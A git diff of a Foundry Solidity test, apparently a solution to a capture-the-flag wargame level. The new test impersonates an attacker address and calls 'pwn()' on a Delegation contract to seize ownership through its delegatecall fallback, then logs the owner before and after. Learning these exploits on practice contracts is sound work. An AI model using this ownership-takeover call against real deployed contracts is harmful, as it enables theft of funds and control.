@@ -22,13 +22,14 @@ contract DelegationTest is Test {
         assert(delegation.owner() == owner);
     }
 
-    function test_changeOwner() public {
-        // address ownerBef = telephone.owner();
-        // vm.prank(user);
-        // attacker.changeOwner();
-
-        // address ownerAft = telephone.owner();
-        // assert((ownerBef == owner));
-        // assert((ownerAft == user));
+    function test_changeOwnerDelegate() public {
+        console.log(delegation.owner());
+         
+        vm.prank(attackerAddress);
+        (bool success, bytes memory data) = address(delegation).call(abi.encodeWithSignature("pwn()"));
+        if (success) {
+          console.log(string(data));
+        }
+        console.log(delegation.owner());
     }
 }
